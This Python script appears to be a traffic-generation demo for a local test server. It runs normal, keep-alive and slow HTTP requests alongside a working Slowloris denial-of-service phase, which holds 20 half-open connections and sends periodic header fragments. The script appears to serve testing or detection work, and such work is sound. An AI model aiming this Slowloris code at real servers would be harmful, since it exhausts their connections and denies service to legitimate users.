import socket
import threading
import time
import requests

HOST = "127.0.0.2"
PORT = 8080

SLOW_CONNECTIONS = 20
ATTACK_DURATION = 30
FRAGMENT_INTERVAL = 3


def normal_browsing():
    print("\n[PHASE 1] NORMAL HTTP BROWSING")

    for i in range(10):
        try:
            response = requests.get(
                f"http://{HOST}:{PORT}/",
                timeout=5
            )
            print(f"Normal request {i + 1}: HTTP {response.status_code}")
        except requests.RequestException as exc:
            print("Request failed:", exc)

        time.sleep(0.3)


def persistent_connections():
    print("\n[PHASE 2] PERSISTENT HTTP CONNECTIONS")

    session = requests.Session()

    try:
        for i in range(5):
            response = session.get(
                f"http://{HOST}:{PORT}/",
                timeout=5
            )
            print(f"Keep-alive request {i + 1}: HTTP {response.status_code}")
    finally:
        session.close()


def legitimate_slow_http():
    print("\n[PHASE 3] LEGITIMATE SLOW HTTP REQUESTS")

    for i in range(2):
        sock = None

        try:
            sock = socket.create_connection((HOST, PORT), timeout=5)

            fragments = [
                b"GET / HTTP/1.1\r\n"
                b"Host:x\r\n"
            ]

            for fragment in fragments:
                sock.sendall(fragment)
                time.sleep(1)

            sock.sendall(b"\r\n")
            sock.settimeout(5)

            response = sock.recv(4096)
            print(
                f"Legitimate slow request {i + 1}: "
                f"{response.splitlines()[0].decode(errors='replace')}"
            )

        except OSError as exc:
            print("Legitimate slow request failed:", exc)

        finally:
            if sock:
                sock.close()


def slowloris_simulation():
    print("\n[PHASE 4] SLOWLORIS TRAFFIC SIMULATION")
    print(f"Opening {SLOW_CONNECTIONS} incomplete HTTP connections.")

    sockets = []

    try:
        for i in range(SLOW_CONNECTIONS):
            sock = socket.create_connection(
                (HOST, PORT),
                timeout=5
            )

            sock.sendall(
                b"GET / HTTP/1.1\r\n"
                b"Host:x\r\n"
            )

            sockets.append(sock)

        print(f"{len(sockets)} incomplete connections established.")

        start = time.time()
        fragment_number = 0

        print("\n[PHASE 5] MIXED NORMAL AND INCOMPLETE TRAFFIC")

        while time.time() - start < ATTACK_DURATION:

            fragment_number += 1

            # Send small, valid header fragments without
            # completing the HTTP header block.
            for sock in sockets:
                try:
                    sock.sendall(
                        b"X:a\r\n"
                    )
                except OSError:
                    pass

            print(
                f"Sent periodic header fragments: {fragment_number}"
            )

            # Generate legitimate HTTP traffic at the same time.
            try:
                response = requests.get(
                    f"http://{HOST}:{PORT}/health",
                    timeout=5
                )
                print(
                    "Concurrent normal HTTP request:",
                    response.status_code
                )
            except requests.RequestException as exc:
                print("Normal request failed:", exc)

            time.sleep(FRAGMENT_INTERVAL)

    finally:
        print("\n[PHASE 6] CLOSING INCOMPLETE CONNECTIONS")

        for sock in sockets:
            try:
                sock.close()
            except OSError:
                pass

        print("All incomplete connections closed.")


def recovery_test():
    print("\n[RECOVERY] Checking normal traffic after connection closure.")

    try:
        response = requests.get(
            f"http://{HOST}:{PORT}/health",
            timeout=5
        )

        print("Recovery HTTP status:", response.status_code)

    except requests.RequestException as exc:
        print("Recovery request failed:", exc)


def main():
    print("=" * 55)
    print("       FINAL LIVE TRAFFIC DEMONSTRATION")
    print("=" * 55)

    print("Target:", HOST, PORT)
    print("This script targets only the local test server.")

    normal_browsing()
    persistent_connections()
    legitimate_slow_http()
    slowloris_simulation()
    recovery_test()

    print("\n" + "=" * 55)
    print("       TRAFFIC GENERATION COMPLETED")
    print("=" * 55)


if __name__ == "__main__":
    main()
